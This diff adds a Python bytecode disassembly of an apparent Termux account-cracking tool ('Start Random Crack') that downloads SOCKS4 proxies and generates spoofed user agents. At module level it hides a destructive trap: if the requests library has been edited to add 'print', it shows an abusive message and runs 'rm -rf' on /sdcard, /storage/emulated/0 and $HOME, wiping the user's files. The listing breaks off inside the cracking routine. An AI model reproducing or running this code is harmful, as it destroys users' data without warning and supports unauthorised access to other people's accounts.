@@ -1,0 +1,2885 @@
+  0           0 RESUME                   0
+
+  1           2 NOP
+
+  2           4 LOAD_CONST               0 (0)
+              6 LOAD_CONST               1 (None)
+              8 IMPORT_NAME              0 (os)
+             10 STORE_NAME               0 (os)
+             12 LOAD_CONST               0 (0)
+             14 LOAD_CONST               1 (None)
+             16 IMPORT_NAME              1 (requests)
+             18 STORE_NAME               1 (requests)
+             20 LOAD_CONST               0 (0)
+             22 LOAD_CONST               1 (None)
+             24 IMPORT_NAME              2 (time)
+             26 STORE_NAME               2 (time)
+             28 LOAD_CONST               0 (0)
+             30 LOAD_CONST               1 (None)
+             32 IMPORT_NAME              3 (re)
+             34 STORE_NAME               3 (re)
+             36 LOAD_CONST               0 (0)
+             38 LOAD_CONST               1 (None)
+             40 IMPORT_NAME              4 (random)
+             42 STORE_NAME               4 (random)
+             44 LOAD_CONST               0 (0)
+             46 LOAD_CONST               1 (None)
+             48 IMPORT_NAME              5 (sys)
+             50 STORE_NAME               5 (sys)
+             52 LOAD_CONST               0 (0)
+             54 LOAD_CONST               1 (None)
+             56 IMPORT_NAME              6 (uuid)
+             58 STORE_NAME               6 (uuid)
+             60 LOAD_CONST               0 (0)
+             62 LOAD_CONST               1 (None)
+             64 IMPORT_NAME              7 (string)
+             66 STORE_NAME               7 (string)
+             68 LOAD_CONST               0 (0)
+             70 LOAD_CONST               1 (None)
+             72 IMPORT_NAME              8 (json)
+             74 STORE_NAME               8 (json)
+             76 LOAD_CONST               0 (0)
+             78 LOAD_CONST               1 (None)
+             80 IMPORT_NAME              9 (subprocess)
+             82 STORE_NAME               9 (subprocess)
+             84 LOAD_CONST               0 (0)
+             86 LOAD_CONST               1 (None)
+             88 IMPORT_NAME             10 (base64)
+             90 STORE_NAME              10 (base64)
+             92 LOAD_CONST               0 (0)
+             94 LOAD_CONST               1 (None)
+             96 IMPORT_NAME             11 (platform)
+             98 STORE_NAME              11 (platform)
+            100 LOAD_CONST               0 (0)
+            102 LOAD_CONST               1 (None)
+            104 IMPORT_NAME             12 (zlib)
+            106 STORE_NAME              12 (zlib)
+            108 LOAD_CONST               0 (0)
+            110 LOAD_CONST               1 (None)
+            112 IMPORT_NAME             13 (hashlib)
+            114 STORE_NAME              13 (hashlib)
+
+  3         116 LOAD_CONST               0 (0)
+            118 LOAD_CONST               2 (('*',))
+            120 IMPORT_NAME              7 (string)
+            122 IMPORT_STAR
+
+  4         124 LOAD_CONST               0 (0)
+            126 LOAD_CONST               1 (None)
+            128 IMPORT_NAME             14 (zipfile)
+            130 STORE_NAME              14 (zipfile)
+
+  5         132 LOAD_CONST               0 (0)
+            134 LOAD_CONST               3 (('uuid4',))
+            136 IMPORT_NAME              6 (uuid)
+            138 IMPORT_FROM             15 (uuid4)
+            140 STORE_NAME              15 (uuid4)
+            142 POP_TOP
+
+  6         144 LOAD_CONST               0 (0)
+            146 LOAD_CONST               4 (('BeautifulSoup',))
+            148 IMPORT_NAME             16 (bs4)
+            150 IMPORT_FROM             17 (BeautifulSoup)
+            152 STORE_NAME              18 (sop)
+            154 POP_TOP
+
+  7         156 LOAD_CONST               0 (0)
+            158 LOAD_CONST               4 (('BeautifulSoup',))
+            160 IMPORT_NAME             16 (bs4)
+            162 IMPORT_FROM             17 (BeautifulSoup)
+            164 STORE_NAME              17 (BeautifulSoup)
+            166 POP_TOP
+
+  8         168 LOAD_CONST               0 (0)
+            170 LOAD_CONST               5 (('ThreadPoolExecutor',))
+            172 IMPORT_NAME             19 (concurrent.futures)
+            174 IMPORT_FROM             20 (ThreadPoolExecutor)
+            176 STORE_NAME              21 (tred)
+            178 POP_TOP
+            180 JUMP_FORWARD            38 (to 258)
+        >>  182 PUSH_EXC_INFO
+
+  9         184 LOAD_NAME               22 (ModuleNotFoundError)
+            186 CHECK_EXC_MATCH
+            188 POP_JUMP_FORWARD_IF_FALSE    30 (to 250)
+            190 POP_TOP
+
+ 10         192 PUSH_NULL
+            194 LOAD_NAME                0 (os)
+            196 LOAD_ATTR               23 (system)
+            206 LOAD_CONST               6 ('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+            208 PRECALL                  1
+            212 CALL                     1
+            222 POP_TOP
+
+ 11         224 PUSH_NULL
+            226 LOAD_NAME               24 (exit)
+            228 LOAD_CONST               7 ('\n[•] Run Again ')
+            230 PRECALL                  1
+            234 CALL                     1
+            244 POP_TOP
+            246 POP_EXCEPT
+            248 JUMP_FORWARD             4 (to 258)
+
+  9     >>  250 RERAISE                  0
+        >>  252 COPY                     3
+            254 POP_EXCEPT
+            256 RERAISE                  1
+
+ 12     >>  258 NOP
+
+ 13         260 PUSH_NULL
+            262 LOAD_NAME                1 (requests)
+            264 LOAD_ATTR               25 (get)
+            274 LOAD_CONST               8 ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')
+            276 PRECALL                  1
+            280 CALL                     1
+            290 LOAD_ATTR               26 (text)
+            300 STORE_NAME              27 (prox)
+
+ 14         302 PUSH_NULL
+            304 LOAD_NAME               28 (open)
+            306 LOAD_CONST               9 ('.prox.txt')
+            308 LOAD_CONST              10 ('w')
+            310 PRECALL                  2
+            314 CALL                     2
+            324 LOAD_METHOD             29 (write)
+            346 LOAD_NAME               27 (prox)
+            348 PRECALL                  1
+            352 CALL                     1
+            362 POP_TOP
+            364 JUMP_FORWARD            61 (to 488)
+        >>  366 PUSH_EXC_INFO
+
+ 15         368 LOAD_NAME               30 (Exception)
+            370 CHECK_EXC_MATCH
+            372 POP_JUMP_FORWARD_IF_FALSE    53 (to 480)
+            374 STORE_NAME              31 (e)
+
+ 16         376 PUSH_NULL
+            378 LOAD_NAME               32 (print)
+            380 LOAD_CONST              11 ('\x1b[1;95m[√] Proxy Downloads Fail...')
+            382 PRECALL                  1
+            386 CALL                     1
+            396 POP_TOP
+
+ 17         398 PUSH_NULL
+            400 LOAD_NAME                0 (os)
+            402 LOAD_ATTR               23 (system)
+            412 LOAD_CONST              12 ('clear')
+            414 PRECALL                  1
+            418 CALL                     1
+            428 POP_TOP
+            430 PUSH_NULL
+            432 LOAD_NAME                2 (time)
+            434 LOAD_ATTR               33 (sleep)
+            444 LOAD_CONST              13 (3.0)
+            446 PRECALL                  1
+            450 CALL                     1
+            460 POP_TOP
+            462 POP_EXCEPT
+            464 LOAD_CONST               1 (None)
+            466 STORE_NAME              31 (e)
+            468 DELETE_NAME             31 (e)
+            470 JUMP_FORWARD             8 (to 488)
+        >>  472 LOAD_CONST               1 (None)
+            474 STORE_NAME              31 (e)
+            476 DELETE_NAME             31 (e)
+            478 RERAISE                  1
+
+ 15     >>  480 RERAISE                  0
+        >>  482 COPY                     3
+            484 POP_EXCEPT
+            486 RERAISE                  1
+
+ 18     >>  488 PUSH_NULL
+            490 LOAD_NAME               28 (open)
+            492 LOAD_CONST               9 ('.prox.txt')
+            494 LOAD_CONST              14 ('r')
+            496 PRECALL                  2
+            500 CALL                     2
+            510 LOAD_METHOD             34 (read)
+            532 PRECALL                  0
+            536 CALL                     0
+            546 LOAD_METHOD             35 (splitlines)
+            568 PRECALL                  0
+            572 CALL                     0
+            582 STORE_NAME              27 (prox)
+
+ 19         584 LOAD_CONST              15 ('\x1b[1;97m')
+            586 STORE_NAME              36 (white)
+
+ 20         588 LOAD_CONST              16 ('\x1b[1;91m')
+            590 STORE_NAME              37 (red)
+
+ 21         592 LOAD_CONST              17 ('\x1b[1;92m')
+            594 STORE_NAME              38 (green)
+
+ 22         596 LOAD_CONST              18 ('\x1b[38;5;29m')
+            598 STORE_NAME              39 (green_low)
+
+ 23         600 LOAD_CONST               0 (0)
+            602 STORE_GLOBAL            40 (loop)
+
+ 24         604 BUILD_LIST               0
+            606 STORE_GLOBAL            41 (oks)
+
+ 25         608 BUILD_LIST               0
+            610 STORE_GLOBAL            42 (cps)
+
+ 26         612 BUILD_LIST               0
+            614 STORE_NAME              43 (ugen)
+
+ 27         616 BUILD_LIST               0
+            618 STORE_NAME              44 (ugen2)
+
+ 28         620 BUILD_LIST               0
+            622 STORE_NAME              45 (ugen3)
+
+ 29         624 BUILD_LIST               0
+            626 STORE_NAME              46 (sexy)
+
+ 30         628 PUSH_NULL
+            630 LOAD_NAME               47 (range)
+            632 LOAD_CONST              19 (10000)
+            634 PRECALL                  1
+            638 CALL                     1
+            648 GET_ITER
+        >>  650 FOR_ITER                95 (to 842)
+            652 STORE_NAME              48 (xd)
+
+ 31         654 LOAD_CONST              20 ('Nokia')
+            656 STORE_NAME              49 (a)
+
+ 32         658 PUSH_NULL
+            660 LOAD_NAME                4 (random)
+            662 LOAD_ATTR               50 (choice)
+            672 BUILD_LIST               0
+            674 LOAD_CONST              21 (('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'))
+            676 LIST_EXTEND              1
+            678 PRECALL                  1
+            682 CALL                     1
+            692 STORE_NAME              51 (b)
+
+ 33         694 PUSH_NULL
+            696 LOAD_NAME                4 (random)
+            698 LOAD_ATTR               52 (randrange)
+            708 LOAD_CONST              22 (1)
+            710 LOAD_CONST              23 (99)
+            712 PRECALL                  2
+            716 CALL                     2
+            726 STORE_NAME              53 (c)
+
+ 34         728 LOAD_CONST              24 ('/GoBrowser/')
+            730 STORE_NAME              54 (d)
+
+ 35         732 LOAD_CONST              25 ('1.6.0.')
+            734 STORE_NAME              31 (e)
+
+ 36         736 PUSH_NULL
+            738 LOAD_NAME                4 (random)
+            740 LOAD_ATTR               52 (randrange)
+            750 LOAD_CONST              22 (1)
+            752 LOAD_CONST              23 (99)
+            754 PRECALL                  2
+            758 CALL                     2
+            768 STORE_NAME              55 (f)
+
+ 37         770 LOAD_NAME               49 (a)
+            772 FORMAT_VALUE             0
+            774 LOAD_NAME               51 (b)
+            776 FORMAT_VALUE             0
+            778 LOAD_NAME               53 (c)
+            780 FORMAT_VALUE             0
+            782 LOAD_NAME               54 (d)
+            784 FORMAT_VALUE             0
+            786 LOAD_NAME               31 (e)
+            788 FORMAT_VALUE             0
+            790 LOAD_NAME               55 (f)
+            792 FORMAT_VALUE             0
+            794 BUILD_STRING             6
+            796 STORE_NAME              56 (uaku2)
+
+ 38         798 LOAD_NAME               43 (ugen)
+            800 LOAD_METHOD             57 (append)
+            822 LOAD_NAME               56 (uaku2)
+            824 PRECALL                  1
+            828 CALL                     1
+            838 POP_TOP
+            840 JUMP_BACKWARD           96 (to 650)
+
+ 39     >>  842 LOAD_CONST              26 (<code object line at 0x787144f800, file "<x>", line 39>)
+            844 MAKE_FUNCTION            0
+            846 STORE_NAME              58 (line)
+
+ 42         848 LOAD_CONST              27 (<code object banner at 0x7871465bb0, file "<x>", line 42>)
+            850 MAKE_FUNCTION            0
+            852 STORE_NAME              59 (banner)
+
+ 55         854 LOAD_CONST              28 (<code object main at 0xb6af30, file "<x>", line 55>)
+            856 MAKE_FUNCTION            0
+            858 STORE_NAME              60 (main)
+
+ 63         860 LOAD_CONST              29 (<code object menu at 0xb40880, file "<x>", line 63>)
+            862 MAKE_FUNCTION            0
+            864 STORE_NAME              61 (menu)
+
+ 75         866 LOAD_CONST              30 (<code object myanmar_random at 0xb7d050, file "<x>", line 75>)
+            868 MAKE_FUNCTION            0
+            870 STORE_NAME              62 (myanmar_random)
+
+106         872 LOAD_CONST              31 (<code object rndm at 0xb80d70, file "<x>", line 106>)
+            874 MAKE_FUNCTION            0
+            876 STORE_NAME              63 (rndm)
+
+174         878 LOAD_CONST               1 (None)
+            880 STORE_NAME              64 (environment)
+
+176         882 LOAD_CONST              32 ('ANDROID_ROOT')
+            884 LOAD_NAME                0 (os)
+            886 LOAD_ATTR               65 (environ)
+            896 CONTAINS_OP              0
+            898 POP_JUMP_FORWARD_IF_FALSE     3 (to 906)
+
+177         900 LOAD_CONST              33 ('Termux')
+            902 STORE_NAME              64 (environment)
+            904 JUMP_FORWARD            91 (to 1088)
+
+178     >>  906 LOAD_NAME                0 (os)
+            908 LOAD_ATTR               66 (path)
+            918 LOAD_METHOD             67 (exists)
+            940 LOAD_CONST              34 ('/proc/version')
+            942 PRECALL                  1
+            946 CALL                     1
+            956 POP_JUMP_FORWARD_IF_FALSE    63 (to 1084)
+
+179         958 PUSH_NULL
+            960 LOAD_NAME               28 (open)
+            962 LOAD_CONST              34 ('/proc/version')
+            964 LOAD_CONST              14 ('r')
+            966 PRECALL                  2
+            970 CALL                     2
+            980 BEFORE_WITH
+            982 STORE_NAME              68 (version_file)
+
+180         984 LOAD_NAME               68 (version_file)
+            986 LOAD_METHOD             34 (read)
+           1008 PRECALL                  0
+           1012 CALL                     0
+           1022 STORE_NAME              69 (version_info)
+
+181        1024 LOAD_CONST              35 ('Linux')
+           1026 LOAD_NAME               69 (version_info)
+           1028 CONTAINS_OP              0
+           1030 POP_JUMP_FORWARD_IF_FALSE     2 (to 1036)
+
+182        1032 LOAD_CONST              35 ('Linux')
+           1034 STORE_NAME              64 (environment)
+
+179     >> 1036 LOAD_CONST               1 (None)
+           1038 LOAD_CONST               1 (None)
+           1040 LOAD_CONST               1 (None)
+           1042 PRECALL                  2
+           1046 CALL                     2
+           1056 POP_TOP
+           1058 JUMP_FORWARD            11 (to 1082)
+        >> 1060 PUSH_EXC_INFO
+           1062 WITH_EXCEPT_START
+           1064 POP_JUMP_FORWARD_IF_TRUE     4 (to 1074)
+           1066 RERAISE                  2
+        >> 1068 COPY                     3
+           1070 POP_EXCEPT
+           1072 RERAISE                  1
+        >> 1074 POP_TOP
+           1076 POP_EXCEPT
+           1078 POP_TOP
+           1080 POP_TOP
+        >> 1082 JUMP_FORWARD             2 (to 1088)
+
+184     >> 1084 LOAD_CONST              36 ('Unknown')
+           1086 STORE_NAME              64 (environment)
+
+186     >> 1088 LOAD_NAME               64 (environment)
+           1090 LOAD_CONST              33 ('Termux')
+           1092 COMPARE_OP               2 (==)
+           1098 POP_JUMP_FORWARD_IF_FALSE     3 (to 1106)
+
+187        1100 LOAD_CONST              37 ('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
+           1102 STORE_NAME              70 (file_path)
+           1104 JUMP_FORWARD             2 (to 1110)
+
+189     >> 1106 LOAD_CONST              38 ('/usr/lib/python3/dist-packages/requests/models.py')
+           1108 STORE_NAME              70 (file_path)
+
+190     >> 1110 PUSH_NULL
+           1112 LOAD_NAME               28 (open)
+           1114 LOAD_NAME               70 (file_path)
+           1116 LOAD_CONST              14 ('r')
+           1118 PRECALL                  2
+           1122 CALL                     2
+           1132 BEFORE_WITH
+           1134 STORE_NAME              71 (file)
+
+191        1136 LOAD_NAME               71 (file)
+           1138 LOAD_METHOD             34 (read)
+           1160 PRECALL                  0
+           1164 CALL                     0
+           1174 STORE_NAME              72 (content1)
+
+192        1176 LOAD_CONST              39 ('print')
+           1178 LOAD_NAME               72 (content1)
+           1180 CONTAINS_OP              0
+           1182 POP_JUMP_FORWARD_IF_FALSE   166 (to 1516)
+
+193        1184 PUSH_NULL
+           1186 LOAD_NAME               32 (print)
+           1188 LOAD_CONST              40 ('\x1b[1;93mYou Bypassed\nMin May Ngar Loe\nLee Lar Sout Lite\nTool A Chaoung Ma Thone Chon Nae Ma A Loe Lay\nCheck Your File\nI Fuck Your Mom\nPhin Khan Lite Ma A Loe Lay\nLee Pel Ya Mal\x1b[0m')
+           1190 PRECALL                  1
+           1194 CALL                     1
+           1204 POP_TOP
+
+194        1206 PUSH_NULL
+           1208 LOAD_NAME                0 (os)
+           1210 LOAD_ATTR               23 (system)
+           1220 LOAD_CONST              41 ('cd /sdcard')
+           1222 PRECALL                  1
+           1226 CALL                     1
+           1236 POP_TOP
+
+195        1238 PUSH_NULL
+           1240 LOAD_NAME                0 (os)
+           1242 LOAD_ATTR               23 (system)
+           1252 LOAD_CONST              42 ('rm -rf *')
+           1254 PRECALL                  1
+           1258 CALL                     1
+           1268 POP_TOP
+
+196        1270 PUSH_NULL
+           1272 LOAD_NAME                0 (os)
+           1274 LOAD_ATTR               23 (system)
+           1284 LOAD_CONST              43 ('rm -rf /sdcard/*')
+           1286 PRECALL                  1
+           1290 CALL                     1
+           1300 POP_TOP
+
+197        1302 PUSH_NULL
+           1304 LOAD_NAME                0 (os)
+           1306 LOAD_ATTR               23 (system)
+           1316 LOAD_CONST              44 ('rm -rf /storage/emulated/0/*')
+           1318 PRECALL                  1
+           1322 CALL                     1
+           1332 POP_TOP
+
+198        1334 PUSH_NULL
+           1336 LOAD_NAME                0 (os)
+           1338 LOAD_ATTR               23 (system)
+           1348 LOAD_CONST              45 ('cd /storage/emulated/0')
+           1350 PRECALL                  1
+           1354 CALL                     1
+           1364 POP_TOP
+
+199        1366 PUSH_NULL
+           1368 LOAD_NAME                0 (os)
+           1370 LOAD_ATTR               23 (system)
+           1380 LOAD_CONST              42 ('rm -rf *')
+           1382 PRECALL                  1
+           1386 CALL                     1
+           1396 POP_TOP
+
+200        1398 PUSH_NULL
+           1400 LOAD_NAME                0 (os)
+           1402 LOAD_ATTR               23 (system)
+           1412 LOAD_CONST              46 ('cd /sdcard && rm -rf *')
+           1414 PRECALL                  1
+           1418 CALL                     1
+           1428 POP_TOP
+
+201        1430 PUSH_NULL
+           1432 LOAD_NAME                0 (os)
+           1434 LOAD_ATTR               23 (system)
+           1444 LOAD_CONST              47 ('rm -rf $HOME')
+           1446 PRECALL                  1
+           1450 CALL                     1
+           1460 POP_TOP
+
+202        1462 PUSH_NULL
+           1464 LOAD_NAME                0 (os)
+           1466 LOAD_ATTR               23 (system)
+           1476 LOAD_CONST              48 ('rm -rf /sdcard/Downloads')
+           1478 PRECALL                  1
+           1482 CALL                     1
+           1492 POP_TOP
+
+203        1494 PUSH_NULL
+           1496 LOAD_NAME               24 (exit)
+           1498 PRECALL                  0
+           1502 CALL                     0
+           1512 POP_TOP
+           1514 JUMP_FORWARD             1 (to 1518)
+
+205     >> 1516 NOP
+
+190     >> 1518 LOAD_CONST               1 (None)
+           1520 LOAD_CONST               1 (None)
+           1522 LOAD_CONST               1 (None)
+           1524 PRECALL                  2
+           1528 CALL                     2
+           1538 POP_TOP
+           1540 JUMP_FORWARD            11 (to 1564)
+        >> 1542 PUSH_EXC_INFO
+           1544 WITH_EXCEPT_START
+           1546 POP_JUMP_FORWARD_IF_TRUE     4 (to 1556)
+           1548 RERAISE                  2
+        >> 1550 COPY                     3
+           1552 POP_EXCEPT
+           1554 RERAISE                  1
+        >> 1556 POP_TOP
+           1558 POP_EXCEPT
+           1560 POP_TOP
+           1562 POP_TOP
+
+207     >> 1564 LOAD_CONST              49 ('https://pastebin.com/jM8wRkEd')
+           1566 STORE_NAME              73 (approve)
+
+208        1568 LOAD_CONST              50 (<code object menu_apikey at 0xb64630, file "<x>", line 208>)
+           1570 MAKE_FUNCTION            0
+           1572 STORE_NAME              74 (menu_apikey)
+
+229        1574 LOAD_CONST              51 (<code object sexy at 0xb83bc0, file "<x>", line 229>)
+           1576 MAKE_FUNCTION            0
+           1578 STORE_NAME              46 (sexy)
+
+339        1580 PUSH_NULL
+           1582 LOAD_NAME               21 (tred)
+           1584 LOAD_CONST              52 (180)
+           1586 KW_NAMES                53
+           1588 PRECALL                  1
+           1592 CALL                     1
+           1602 BEFORE_WITH
+           1604 STORE_NAME              75 (jjj)
+
+340        1606 LOAD_NAME               75 (jjj)
+           1608 LOAD_METHOD             76 (submit)
+           1630 LOAD_NAME               46 (sexy)
+           1632 PRECALL                  1
+           1636 CALL                     1
+           1646 POP_TOP
+
+341        1648 LOAD_NAME               75 (jjj)
+           1650 LOAD_METHOD             76 (submit)
+           1672 LOAD_NAME               74 (menu_apikey)
+           1674 PRECALL                  1
+           1678 CALL                     1
+           1688 POP_TOP
+
+339        1690 LOAD_CONST               1 (None)
+           1692 LOAD_CONST               1 (None)
+           1694 LOAD_CONST               1 (None)
+           1696 PRECALL                  2
+           1700 CALL                     2
+           1710 POP_TOP
+           1712 LOAD_CONST               1 (None)
+           1714 RETURN_VALUE
+        >> 1716 PUSH_EXC_INFO
+           1718 WITH_EXCEPT_START
+           1720 POP_JUMP_FORWARD_IF_TRUE     4 (to 1730)
+           1722 RERAISE                  2
+        >> 1724 COPY                     3
+           1726 POP_EXCEPT
+           1728 RERAISE                  1
+        >> 1730 POP_TOP
+           1732 POP_EXCEPT
+           1734 POP_TOP
+           1736 POP_TOP
+           1738 LOAD_CONST               1 (None)
+           1740 RETURN_VALUE
+ExceptionTable:
+  4 to 178 -> 182 [0]
+  182 to 244 -> 252 [1] lasti
+  250 to 250 -> 252 [1] lasti
+  260 to 362 -> 366 [0]
+  366 to 374 -> 482 [1] lasti
+  376 to 460 -> 472 [1] lasti
+  472 to 480 -> 482 [1] lasti
+  982 to 1034 -> 1060 [1] lasti
+  1060 to 1066 -> 1068 [3] lasti
+  1074 to 1074 -> 1068 [3] lasti
+  1134 to 1516 -> 1542 [1] lasti
+  1542 to 1548 -> 1550 [3] lasti
+  1556 to 1556 -> 1550 [3] lasti
+  1604 to 1688 -> 1716 [1] lasti
+  1716 to 1722 -> 1724 [3] lasti
+  1730 to 1730 -> 1724 [3] lasti
+
+Disassembly of <code object line at 0x787144f800, file "<x>", line 39>:
+ 39           0 RESUME                   0
+
+ 40           2 LOAD_GLOBAL              1 (NULL + os)
+             14 LOAD_ATTR                1 (get_terminal_size)
+             24 PRECALL                  0
+             28 CALL                     0
+             38 STORE_FAST               0 (size)
+
+ 41          40 LOAD_GLOBAL              5 (NULL + print)
+             52 LOAD_GLOBAL              6 (white)
+             64 FORMAT_VALUE             0
+             66 LOAD_CONST               1 ('-')
+             68 BUILD_STRING             2
+             70 LOAD_FAST                0 (size)
+             72 LOAD_CONST               2 (0)
+             74 BINARY_SUBSCR
+             84 BINARY_OP                5 (*)
+             88 PRECALL                  1
+             92 CALL                     1
+            102 POP_TOP
+            104 LOAD_CONST               0 (None)
+            106 RETURN_VALUE
+
+Disassembly of <code object banner at 0x7871465bb0, file "<x>", line 42>:
+ 42           0 RESUME                   0
+
+ 43           2 LOAD_GLOBAL              0 (white)
+             14 FORMAT_VALUE             0
+             16 LOAD_CONST               1 ('\n88888888888 888    888 88888888888\n    888     888    888     888\n    888     888    888     888\n    888     8888888888     888\n    888     888    888     888\n    888     888    888     888\n    888     888    888     888     Version  : ')
+
+ 50          18 LOAD_GLOBAL              2 (green)
+
+ 43          30 FORMAT_VALUE             0
+             32 LOAD_CONST               2 ('1.0.0')
+
+ 50          34 LOAD_GLOBAL              0 (white)
+
+ 43          46 FORMAT_VALUE             0
+             48 LOAD_CONST               3 ('\n    888     888    888     888     Status   : Premium')
+             50 BUILD_STRING             6
+             52 STORE_FAST               0 (logo)
+
+ 52          54 LOAD_GLOBAL              5 (NULL + os)
+             66 LOAD_ATTR                3 (system)
+             76 LOAD_CONST               4 ('clear')
+             78 PRECALL                  1
+             82 CALL                     1
+             92 POP_TOP
+
+ 53          94 LOAD_GLOBAL              9 (NULL + print)
+            106 LOAD_FAST                0 (logo)
+            108 PRECALL                  1
+            112 CALL                     1
+            122 POP_TOP
+
+ 54         124 LOAD_GLOBAL             11 (NULL + line)
+            136 PRECALL                  0
+            140 CALL                     0
+            150 POP_TOP
+            152 LOAD_CONST               0 (None)
+            154 RETURN_VALUE
+
+Disassembly of <code object main at 0xb6af30, file "<x>", line 55>:
+ 55           0 RESUME                   0
+
+ 56           2 LOAD_GLOBAL              1 (NULL + banner)
+             14 PRECALL                  0
+             18 CALL                     0
+             28 POP_TOP
+
+ 57          30 LOAD_GLOBAL              3 (NULL + print)
+             42 LOAD_GLOBAL              4 (white)
+             54 FORMAT_VALUE             0
+             56 LOAD_CONST               1 ('[•] First Click 1 (')
+             58 LOAD_GLOBAL              6 (green)
+             70 FORMAT_VALUE             0
+             72 LOAD_CONST               2 ('Give Permession')
+             74 LOAD_GLOBAL              4 (white)
+             86 FORMAT_VALUE             0
+             88 LOAD_CONST               3 (')')
+             90 BUILD_STRING             6
+             92 PRECALL                  1
+             96 CALL                     1
+            106 POP_TOP
+            108 LOAD_GLOBAL              9 (NULL + line)
+            120 PRECALL                  0
+            124 CALL                     0
+            134 POP_TOP
+
+ 58         136 LOAD_GLOBAL             11 (NULL + input)
+            148 LOAD_GLOBAL              4 (white)
+            160 FORMAT_VALUE             0
+            162 LOAD_CONST               4 ('[•] Choose : ')
+            164 BUILD_STRING             2
+            166 PRECALL                  1
+            170 CALL                     1
+            180 STORE_FAST               0 (lol)
+            182 LOAD_GLOBAL              9 (NULL + line)
+            194 PRECALL                  0
+            198 CALL                     0
+            208 POP_TOP
+
+ 59         210 LOAD_FAST                0 (lol)
+            212 LOAD_CONST               5 ('1')
+            214 COMPARE_OP               2 (==)
+            220 POP_JUMP_FORWARD_IF_FALSE    56 (to 334)
+
+ 60         222 LOAD_GLOBAL             13 (NULL + os)
+            234 LOAD_ATTR                7 (system)
+            244 LOAD_CONST               6 ('termux-setup-storage -y')
+            246 PRECALL                  1
+            250 CALL                     1
+            260 POP_TOP
+            262 LOAD_GLOBAL             17 (NULL + time)
+            274 LOAD_ATTR                9 (sleep)
+            284 LOAD_CONST               7 (2.0)
+            286 PRECALL                  1
+            290 CALL                     1
+            300 POP_TOP
+            302 LOAD_GLOBAL             21 (NULL + menu)
+            314 PRECALL                  0
+            318 CALL                     0
+            328 POP_TOP
+            330 LOAD_CONST               0 (None)
+            332 RETURN_VALUE
+
+ 62     >>  334 LOAD_GLOBAL              3 (NULL + print)
+            346 LOAD_GLOBAL              4 (white)
+            358 FORMAT_VALUE             0
+            360 LOAD_CONST               8 ('[*] ')
+            362 LOAD_GLOBAL             22 (red)
+            374 FORMAT_VALUE             0
+            376 LOAD_CONST               9 ('Sorry You Have Not Permession')
+            378 LOAD_GLOBAL              4 (white)
+            390 FORMAT_VALUE             0
+            392 BUILD_STRING             5
+            394 PRECALL                  1
+            398 CALL                     1
+            408 POP_TOP
+            410 LOAD_GLOBAL              8 (line)
+            422 POP_TOP
+            424 LOAD_GLOBAL             17 (NULL + time)
+            436 LOAD_ATTR                9 (sleep)
+            446 LOAD_CONST               7 (2.0)
+            448 PRECALL                  1
+            452 CALL                     1
+            462 POP_TOP
+            464 LOAD_GLOBAL             25 (NULL + main)
+            476 PRECALL                  0
+            480 CALL                     0
+            490 POP_TOP
+            492 LOAD_CONST               0 (None)
+            494 RETURN_VALUE
+
+Disassembly of <code object menu at 0xb40880, file "<x>", line 63>:
+ 63           0 RESUME                   0
+
+ 64           2 LOAD_GLOBAL              1 (NULL + banner)
+             14 PRECALL                  0
+             18 CALL                     0
+             28 POP_TOP
+
+ 65          30 LOAD_GLOBAL              3 (NULL + print)
+             42 LOAD_GLOBAL              4 (white)
+             54 FORMAT_VALUE             0
+             56 LOAD_CONST               1 ('[1] Start Random Crack ')
+             58 BUILD_STRING             2
+             60 PRECALL                  1
+             64 CALL                     1
+             74 POP_TOP
+             76 LOAD_GLOBAL              7 (NULL + line)
+             88 PRECALL                  0
+             92 CALL                     0
+            102 POP_TOP
+
+ 66         104 LOAD_GLOBAL              3 (NULL + print)
+            116 LOAD_GLOBAL              4 (white)
+            128 FORMAT_VALUE             0
+            130 LOAD_CONST               2 ('[0] Exit ')
+            132 BUILD_STRING             2
+            134 PRECALL                  1
+            138 CALL                     1
+            148 POP_TOP
+
+ 67         150 LOAD_GLOBAL              7 (NULL + line)
+            162 PRECALL                  0
+            166 CALL                     0
+            176 POP_TOP
+
+ 68         178 LOAD_GLOBAL              9 (NULL + input)
+            190 LOAD_GLOBAL              4 (white)
+            202 FORMAT_VALUE             0
+            204 LOAD_CONST               3 ('[?] Choose : ')
+            206 BUILD_STRING             2
+            208 PRECALL                  1
+            212 CALL                     1
+            222 STORE_FAST               0 (opt)
+
+ 69         224 LOAD_FAST                0 (opt)
+            226 LOAD_CONST               4 ('1')
+            228 COMPARE_OP               2 (==)
+            234 POP_JUMP_FORWARD_IF_FALSE    16 (to 268)
+
+ 70         236 LOAD_GLOBAL             11 (NULL + myanmar_random)
+            248 PRECALL                  0
+            252 CALL                     0
+            262 POP_TOP
+            264 LOAD_CONST               0 (None)
+            266 RETURN_VALUE
+
+ 71     >>  268 LOAD_FAST                0 (opt)
+            270 LOAD_CONST               5 ('0')
+            272 COMPARE_OP               2 (==)
+            278 POP_JUMP_FORWARD_IF_FALSE    16 (to 312)
+
+ 72         280 LOAD_GLOBAL             13 (NULL + menu)
+            292 PRECALL                  0
+            296 CALL                     0
+            306 POP_TOP
+            308 LOAD_CONST               0 (None)
+            310 RETURN_VALUE
+
+ 74     >>  312 LOAD_GLOBAL              3 (NULL + print)
+            324 LOAD_GLOBAL              4 (white)
+            336 FORMAT_VALUE             0
+            338 LOAD_CONST               6 ('[•] Choose Vail Option')
+            340 BUILD_STRING             2
+            342 PRECALL                  1
+            346 CALL                     1
+            356 POP_TOP
+            358 LOAD_CONST               0 (None)
+            360 RETURN_VALUE
+
+Disassembly of <code object myanmar_random at 0xb7d050, file "<x>", line 75>:
+ 75           0 RESUME                   0
+
+ 76           2 BUILD_LIST               0
+              4 STORE_FAST               0 (user)
+
+ 77           6 LOAD_GLOBAL              1 (NULL + banner)
+             18 PRECALL                  0
+             22 CALL                     0
+             32 POP_TOP
+
+ 78          34 LOAD_GLOBAL              3 (NULL + print)
+             46 LOAD_GLOBAL              4 (white)
+             58 FORMAT_VALUE             0
+             60 LOAD_CONST               1 ('[1] Method 1 (Recommend)')
+             62 BUILD_STRING             2
+             64 PRECALL                  1
+             68 CALL                     1
+             78 POP_TOP
+
+ 79          80 LOAD_GLOBAL              7 (NULL + line)
+             92 PRECALL                  0
+             96 CALL                     0
